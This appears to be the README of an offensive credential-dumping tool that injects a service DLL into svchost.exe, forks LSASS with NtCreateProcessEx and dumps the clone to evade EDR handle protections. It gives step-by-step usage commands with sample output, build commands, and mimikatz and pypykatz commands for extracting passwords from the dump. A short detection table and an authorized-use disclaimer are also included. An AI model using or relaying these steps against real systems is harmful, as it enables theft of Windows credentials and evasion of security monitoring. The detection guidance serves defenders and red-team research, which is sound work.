# ServiceCloneDump — LSASS Dump via svchost.exe Service DLL + Process Fork

> Dump LSASS credentials by injecting a service DLL into `svchost.exe`, opening LSASS (trusted process exemption), forking it with `NtCreateProcessEx`, and dumping the clone with `MiniDumpWriteDump`.

---

## How It Works

Many EDRs use `ObRegisterCallbacks` to monitor and restrict handle requests to `lsass.exe`. However, certain Windows system processes — including `svchost.exe` — are often placed on an **allowlist** to avoid breaking OS functionality. If a process like `svchost.exe` requests a handle to LSASS, the EDR grants it unconditionally.

This technique exploits that trust relationship by registering a custom service DLL that runs **inside** `svchost.exe`:

1. **SvchostLoader.exe** creates registry entries for a new `SERVICE_WIN32_SHARE_PROCESS` service.
2. It registers a custom svchost group and starts the service via the Service Control Manager (SCM).
3. **SCM spawns `svchost.exe -k CredDiagGroup`**, which loads our DLL and calls its exported `ServiceMain`.
4. Running inside `svchost.exe`, the DLL calls `OpenProcess(LSASS)` — the handle is granted because `svchost.exe` is a trusted process.
5. The DLL **forks LSASS** using the undocumented `NtCreateProcessEx` — creating a memory-identical clone.
6. `MiniDumpWriteDump` is called on the **clone** (not the live LSASS), producing a credential dump.
7. The clone is terminated, the service self-stops, and the loader auto-cleans all registry artifacts.

```
┌─────────────────┐    creates    ┌──────────────────────────────────┐
│ SvchostLoader   │ ───registry───│ HKLM\Services\CredDumpSvc        │
│ (admin console) │   + group     │   Type=0x20 (SHARE_PROCESS)      │
│                 │               │   Parameters\ServiceDll=our.dll  │
└────────┬────────┘               └──────────────────────────────────┘
         │ starts via SCM
         ▼
┌────────────────────────────────┐ OpenProcess  ┌───────────┐
│ svchost.exe -k CredDiagGroup   │────────────> │ lsass.exe │
│  └─ SvcCloneDll.dll            │  (trusted!)  │  PID 908  │
│     ServiceMain()              │              └───────────┘
│       │                        │                    │
│       │ NtCreateProcessEx      │                    │
│       ▼                        │              ┌───────────┐
│     Fork LSASS clone  ──────────────────────  │ Clone PID │
│       │                        │              │(suspended)│
│       │ MiniDumpWriteDump      │              └───────────┘
│       ▼                        │
│     lsass.dmp written          │
│     Clone terminated           │
│     Service self-stops         │
└────────────────────────────────┘
```

**Why fork?** Dumping a live LSASS process can trigger additional detections (e.g., ETW events, page-fault analysis). Forking creates a snapshot in a separate process — no ongoing reads against the live LSASS.

---

## Usage

### Step 1 — Reconnaissance

Open an **elevated** (Administrator) command prompt:

```
SvchostLoader.exe --recon
```

Output:
```
=== ServiceCloneDump Recon ===

[*] Technique: Register DLL as svchost.exe-hosted service
[*] DLL forks LSASS via NtCreateProcessEx, dumps the clone

[+] Running as Administrator: YES
[+] SeDebugPrivilege: Available
[+] SCM full access: YES
[+] Svchost groups registry writable: YES
[*] Service 'CredDumpSvc' exists: No (clean)

[*] Attack flow:
    1. Loader creates service registry entries for svchost-hosted DLL
    2. Loader adds svchost group, starts service via SCM
    3. SCM spawns: svchost.exe -k CredDiagGroup
    4. svchost.exe loads our DLL, calls ServiceMain
    5. DLL opens LSASS (svchost.exe is typically trusted by EDRs)
    6. DLL forks LSASS via NtCreateProcessEx → clone process
    7. MiniDumpWriteDump on the clone → credential dump
    8. Clone is terminated, service self-stops

[+] All prerequisites met — technique should work!
```

<!-- Screenshot: SvchostLoader.exe --recon output -->

### Step 2 — Execute the Dump

```
SvchostLoader.exe --dump --out C:\Windows\Temp\debug.dmp --dll C:\path\to\SvcCloneDll.dll
```

Output:
```
=== ServiceCloneDump — svchost.exe Service DLL + Process Fork ===

[*] DLL:  C:\path\to\SvcCloneDll.dll
[*] Dump: C:\Windows\Temp\debug.dmp

[+] SeDebugPrivilege enabled
[*] Creating service registry entries...
[+] Service registry created: CredDumpSvc
[+] Svchost group registered: CredDiagGroup
[*] Starting service via Service Control Manager...
[+] Service created in SCM
[+] Service started — svchost.exe is loading our DLL!
[*] svchost.exe will open LSASS with PROCESS_ALL_ACCESS
[*] DLL will fork LSASS via NtCreateProcessEx and dump the clone
[*] Waiting for dump to complete...
[+] Service stopped (completed)

[+] LSASS DUMP SUCCESSFUL!
[+] Dump file: C:\Windows\Temp\debug.dmp
[+] Dump size: 59432960 bytes (56.68 MB)

[+] Technique: svchost.exe service DLL + process fork (NtCreateProcessEx)

[*] Auto-cleaning up service entries...
[+] Service deleted from SCM
[+] Service registry keys deleted
[+] Svchost group entry deleted
[+] Cleanup complete
```

<!-- Screenshot: SvchostLoader.exe --dump output -->

### Step 3 — Manual Cleanup (if needed)

If the loader crashes or you Ctrl+C during execution:

```
SvchostLoader.exe --cleanup
```

### Step 4 — Parse the Dump

```
mimikatz # sekurlsa::minidump C:\Windows\Temp\debug.dmp
mimikatz # sekurlsa::logonpasswords
```

Or with pypykatz:
```
pypykatz lsa minidump C:\Windows\Temp\debug.dmp
```

<!-- Screenshot: Credential extraction from the dump -->

---

## Build

### MinGW (x86_64)

```bash
# Service DLL (loaded by svchost.exe)
x86_64-w64-mingw32-g++ -shared -o SvcCloneDll.dll SvcCloneDll.cpp \
    -ldbghelp -ladvapi32 -lntdll -static -static-libgcc -static-libstdc++

# Loader (registers service, starts it, monitors)
x86_64-w64-mingw32-g++ -o SvchostLoader.exe SvchostLoader.cpp \
    -ladvapi32 -static
```

### MSVC

```bash
# Service DLL
cl /LD /EHsc SvcCloneDll.cpp /link dbghelp.lib advapi32.lib ntdll.lib

# Loader
cl /EHsc SvchostLoader.cpp /link advapi32.lib
```

---

## How EDRs Can Detect This

| Detection Vector | Description |
|---|---|
| **New svchost service group** | Creating a new service group under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost` is unusual. Registry monitoring (Sysmon Event ID 12/13) can flag this. |
| **`SERVICE_WIN32_SHARE_PROCESS` with unknown DLL** | A new service of type 0x20 pointing to an unsigned/unknown DLL is suspicious. Service creation events (Event ID 7045) should be monitored. |
| **`NtCreateProcessEx` on LSASS** | Process forking/cloning of LSASS is a known credential theft technique. Stack-based analysis can identify calls to `NtCreateProcessEx` with an LSASS handle. |
| **`MiniDumpWriteDump` from svchost** | Calling `dbghelp!MiniDumpWriteDump` from any `svchost.exe` instance is anomalous. API monitoring or ETW can flag this. |
| **Short-lived svchost.exe instance** | A `svchost.exe` process that starts and stops within seconds is behaviorally suspicious. Process lifetime analysis can catch this. |
| **Large file creation in Temp** | Writing a ~50-60 MB file (the dump) is a signal, especially from a system service context. |
| **Service registry auto-cleanup** | The immediate deletion of service registry entries after execution is a cleanup pattern associated with attack tools. |

---

## MITRE ATT&CK

| ID | Technique |
|---|---|
| T1003.001 | OS Credential Dumping: LSASS Memory |
| T1543.003 | Create or Modify System Process: Windows Service |
| T1106 | Native API |

---

## Files

```
ServiceCloneDump/
├── README.md
├── native/
│   ├── SvcCloneDll.cpp        # Service DLL (fork + dump)
│   └── SvchostLoader.cpp      # Loader (registers & starts the service)
└── bin/
    ├── SvcCloneDll.dll        # Pre-built DLL (x64)
    └── SvchostLoader.exe      # Pre-built loader (x64)
```

---

## Requirements

- Windows 10/11 (x64)
- Administrator privileges (SeDebugPrivilege)
- Service Control Manager access
- LSASS must not be running as PPL (Protected Process Light) — or you need a PPL bypass

---

## References

- [Svchost DLL-based Persistence](https://www.hexacorn.com/blog/2015/12/18/the-typographical-and-an-aging-collection/) — svchost service DLL hosting mechanism
- [NtCreateProcessEx](https://learn.microsoft.com/en-us/windows/win32/procthread/zwcreateprocessex) — Undocumented process fork API
- [ObRegisterCallbacks](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-obregistercallbacks) — Kernel mechanism used by EDRs to protect LSASS

---

> **Disclaimer:** This tool is intended for authorized security testing and research only. Unauthorized credential dumping is illegal. Use responsibly.
